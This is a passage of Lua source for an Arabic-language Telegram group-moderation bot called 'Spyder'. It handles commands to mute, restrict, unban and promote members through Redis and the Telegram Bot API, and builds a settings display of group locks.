send(msg.chat_id_, msg.id_, texts)
end
else
send(msg.chat_id_, msg.id_, '⚠︙ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^كتم (%d+)$") and Mod(msg) then
local userid = text:match("^كتم (%d+)$")
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠︙هذا بوت لا يمكنني الطرد")
return false 
end
if GetZanCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك كتم ( '..Get_Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙ العضو ↫ '..userid..''
status  = '\n⌔︙ تم كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
if text == ("الغاء كتم") and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
redis:srem('Spyder:'..bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء كتم @(.*)$") and Mod(msg) then
local username = text:match("^الغاء كتم @(.*)$")
function start_function(extra, result, success)
if result.id_ then
redis:srem('Spyder:'..bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n⌔︙ العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء كتمه من هنا'
texts = usertext..status
else
texts = '⚠︙ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء كتم (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء كتم (%d+)$") 
redis:srem('Spyder:'..bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙ العضو ↫ '..userid..''
status  = '\n⌔︙ تم الغاء كتمه من هنا'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("تقيد") and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
if GetZanCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك طرد او حظر او كتم او تقيد ( '..Get_Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تقيده في المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد @(.*)$") and Mod(msg) then
local username = text:match("^تقيد @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠︙ عذرا عزيزي العضو هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if GetZanCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك طرد او حظر او كتم او تقيد ( '..Get_Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
usertext = '\n⌔︙ العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تقيده في المجموعه'
texts = usertext..status
else
texts = '⚠︙ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^تقيد (%d+)$")
if GetZanCan(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n⚠︙ عذرا لا يمكنك طرد او حظر او كتم او تقيد ( '..Get_Rutba(userid,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تقيده في المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙ العضو ↫ '..userid..''
status  = '\n⌔︙ تم تقيده في المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
------------------------------------------------------------------------
if text == ("الغاء تقيد") and msg.reply_to_message_id_ and Mod(msg) then
function start_function(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد @(.*)$") and Mod(msg) then
local username = text:match("^الغاء تقيد @(.*)$")
function start_function(extra, result, success)
if result.id_ then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
usertext = '\n⌔︙ العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء تقيده'
texts = usertext..status
else
texts = '⚠︙ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء تقيد (%d+)$")
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙ العضو ↫ '..userid..''
status  = '\n⌔︙ تم الغاء تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text and text:match('^رفع القيود @(.*)') and Owners(msg) then 
local username = text:match('^رفع القيود @(.*)') 
function start_function(extra, result, success)
if result.id_ then
if Sudo_id(msg) then
redis:srem('Spyder:'..bot_id..'GBan:User',result.id_)
redis:srem('Spyder:'..bot_id..'Ban:User'..msg.chat_id_,result.id_)
redis:srem('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء القيود عنه'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
redis:srem('Spyder:'..bot_id..'Ban:User'..msg.chat_id_,result.id_)
redis:srem('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء القيود عنه'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
end
else
Text = '⌔︙ المعرف خطأ'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == "رفع القيود" and Owners(msg) then
function start_function(extra, result, success)
if Sudo_id(msg) then
redis:srem('Spyder:'..bot_id..'GBan:User',result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء القيود عنه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
else
redis:srem('Spyder:'..bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
redis:srem('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم الغاء القيود عنه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match('^كشف القيود @(.*)') and Owners(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function start_function(extra, result, success)
if result.id_ then
if redis:sismember('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,result.id_) then
Muted = 'مكتوم 🔇'
else
Muted = 'غير مكتوم 🔊'
end
if redis:sismember('Spyder:'..bot_id..'Ban:User'..msg.chat_id_,result.id_) then
Ban = 'محظور ⚠️'
else
Ban = 'غير محظور 🚸'
end
if redis:sismember('Spyder:'..bot_id..'GBan:User',result.id_) then
GBan = 'محظور عام 📛'
else
GBan = 'غير محظور عام 🚯'
end
Textt = "⌔︙ الحظر العام ↫ "..GBan.."\n⌔︙ الحظر ↫ "..Ban.."\n⌔︙ الكتم ↫ "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
else
Text = '⌔︙ المعرف خطأ'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end

if text == "كشف القيود" and Owners(msg) then 
function start_function(extra, result, success)
if redis:sismember('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if redis:sismember('Spyder:'..bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if redis:sismember('Spyder:'..bot_id..'GBan:User',result.sender_user_id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
Textt = "⌔︙ الحظر العام ↫ "..GBan.."\n⌔︙ الحظر ↫ "..Ban.."\n⌔︙ الكتم ↫ "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end

if text == ("رفع ادمن بالكروب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم رفعه ادمن بالكروب '
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن بالكروب @(.*)$") and Constructor(msg) then
local username = text:match("^رفع ادمن بالكروب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم رفعه ادمن بالكروب '
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⌔︙ لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل ادمن بالكروب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله ادمن من الكروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن بالكروب @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل ادمن بالكروب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله ادمن من الكروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⌔︙ لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end


if text == ("رفع ادمن بكل الصلاحيات") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم رفعه ادمن بالكروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن بكل الصلاحيات @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع ادمن بكل الصلاحيات @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم رفعه ادمن بالكروب بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
else
send(msg.chat_id_, msg.id_, '⌔︙ لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل ادمن بكل الصلاحيات") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله ادمن من الكروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن بكل الصلاحيات @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل ادمن بكل الصلاحيات @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله ادمن من الكروب بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⌔︙ لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == 'الاعدادات' and Mod(msg) then    
if redis:get('Spyder:'..bot_id..'lockpin'..msg.chat_id_) then    
lock_pin = 'مقفول'
else 
lock_pin = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id..'lock:tagservr'..msg.chat_id_) then    
lock_tagservr = 'مقفول'
else 
lock_tagservr = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id..'lock:text'..msg.chat_id_) then    
lock_text = 'مقفول'
else 
lock_text = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
lock_add = 'مقفول'
else 
lock_add = 'مفتوح'    
end    
if redis:get('Spyder:'..bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
lock_join = 'مقفول'
else 
lock_join = 'مفتوح'    
end    
if redis:get('Spyder:'..bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit = 'مقفول'
else 
lock_edit = 'مفتوح'    
end
print(welcome)
if redis:get('Spyder:'..bot_id..'Get:Welcome:Group'..msg.chat_id_) then
welcome = 'مقفول'
else 
welcome = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit_med = 'مقفول'
else 
lock_edit_med = 'مفتوح'    
end
if redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
flood = 'بالطرد 🚷'     
elseif redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
flood = 'بالتقيد 🔏'     
elseif redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
flood = 'بالكتم 🔇'           
elseif redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "del" then     
flood = 'بالحذف 🗑'           
else     
flood = 'مفتوح'     
end
if redis:get('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_) == "del" then
lock_photo = 'مقفول' 
elseif redis:get('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = 'بالتقيد 🔏'   
elseif redis:get('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = 'بالطرد 🚷'   
else
lock_photo = 'مفتوح'   
end    
if redis:get('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_) == "del" then
lock_phon = 'مقفول' 
elseif redis:get('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = 'بالطرد 🚷'    
else
lock_phon = 'مفتوح'    
end    
if redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "del" then
lock_links = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "ked" then
lock_links = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "ktm" then
lock_links = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "kick" then
lock_links = 'بالطرد 🚷'    
else
lock_links = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = 'بالكتم 🔇'   
elseif redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = 'بالطرد 🚷'    
else
lock_cmds = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "del" then
lock_user = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "ked" then
lock_user = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "ktm" then
lock_user = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "kick" then
lock_user = 'بالطرد 🚷'    
else
lock_user = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = 'بالطرد 🚷'    
else
lock_hash = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_muse = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = 'بالطرد 🚷'    
else
lock_muse = 'مفتوح'    
end 
if redis:get('Spyder:'..bot_id.."lock:Video"..msg.chat_id_) == "del" then
lock_ved = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = 'بالطرد 🚷'    
else
lock_ved = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_) == "del" then
lock_gif = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = 'بالطرد 🚷'    
else
lock_gif = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = 'بالطرد 🚷'    
else
lock_ste = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:geam"..msg.chat_id_) == "del" then
lock_geam = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = 'بالطرد 🚷'    
else
lock_geam = 'مفتوح'    
end    
if redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_vico = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
